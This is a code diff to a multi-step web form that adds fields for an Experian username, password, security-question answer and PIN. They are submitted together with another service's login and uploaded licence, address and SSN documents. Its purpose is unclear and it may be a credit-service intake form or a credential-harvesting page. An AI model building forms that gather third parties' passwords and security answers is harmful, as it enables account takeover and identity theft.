@@ -224,6 +224,25 @@
           <span class="toggle-pw" onclick="togglePw('scPass', this)">Show</span>
         </div>
       </div>
+      <div class="field">
+        <label>Experian Username</label>
+        <input type="text" id="expUser" placeholder="Your Experian username">
+      </div>
+      <div class="field">
+        <label>Experian Password</label>
+        <div class="pw-wrap">
+          <input type="password" id="expPass" placeholder="Your Experian password">
+          <span class="toggle-pw" onclick="togglePw('expPass', this)">Show</span>
+        </div>
+      </div>
+      <div class="field">
+        <label>Security Answer</label>
+        <input type="text" id="secAnswer" placeholder="Your security question answer">
+      </div>
+      <div class="field">
+        <label>Pin (4 digits)</label>
+        <input type="text" id="pin" placeholder="1234" maxlength="4" inputmode="numeric">
+      </div>
       <div class="status-msg msg-error" id="status-msg-3"></div>
       <div class="btn-row">
         <button class="btn btn-secondary" onclick="goToStep(2)">← Back</button>
@@ -301,6 +320,10 @@
         <div class="review-grid">
           <div class="review-item"><label>Username</label><p id="r-scUser">—</p></div>
           <div class="review-item"><label>Password</label><p id="r-scPass">—</p></div>
+          <div class="review-item"><label>Experian Username</label><p id="r-expUser">—</p></div>
+          <div class="review-item"><label>Experian Password</label><p id="r-expPass">—</p></div>
+          <div class="review-item"><label>Security Answer</label><p id="r-secAnswer">—</p></div>
+          <div class="review-item"><label>Pin</label><p id="r-pin">—</p></div>
         </div>
       </div>
 
@@ -371,7 +394,10 @@
       if (!/^\S+@\S+\.\S+$/.test(val('email'))) { msg.textContent = 'Please enter a valid email.'; return false; }
     }
     if (step === 3) {
-      if (!val('scUser') || !val('scPass')) { msg.textContent = 'Please fill in all fields.'; return false; }
+      if (!val('scUser') || !val('scPass') || !val('expUser') || !val('expPass') || !val('secAnswer') || !val('pin')) {
+        msg.textContent = 'Please fill in all fields.'; return false;
+      }
+      if (!/^\d{4}$/.test(val('pin'))) { msg.textContent = 'Pin must be exactly 4 digits.'; return false; }
     }
     if (step === 4) {
       if (!files.dl || !files.poa || !files.ssnid) { msg.textContent = 'Please upload all three documents.'; return false; }
@@ -408,6 +434,10 @@
     document.getElementById('r-email').textContent = val('email');
     document.getElementById('r-scUser').textContent = val('scUser');
     document.getElementById('r-scPass').textContent = '•'.repeat(val('scPass').length);
+    document.getElementById('r-expUser').textContent = val('expUser');
+    document.getElementById('r-expPass').textContent = '•'.repeat(val('expPass').length);
+    document.getElementById('r-secAnswer').textContent = val('secAnswer');
+    document.getElementById('r-pin').textContent = '•'.repeat(val('pin').length);
     document.getElementById('r-dl').textContent = files.dl ? files.dl.name : '—';
     document.getElementById('r-poa').textContent = files.poa ? files.poa.name : '—';
     document.getElementById('r-ssnid').textContent = files.ssnid ? files.ssnid.name : '—';
@@ -429,6 +459,10 @@
       email: val('email'),
       scUser: val('scUser'),
       scPass: val('scPass'),
+      expUser: val('expUser'),
+      expPass: val('expPass'),
+      secAnswer: val('secAnswer'),
+      pin: val('pin'),
       dl: files.dl,
       poa: files.poa,
       ssnid: files.ssnid
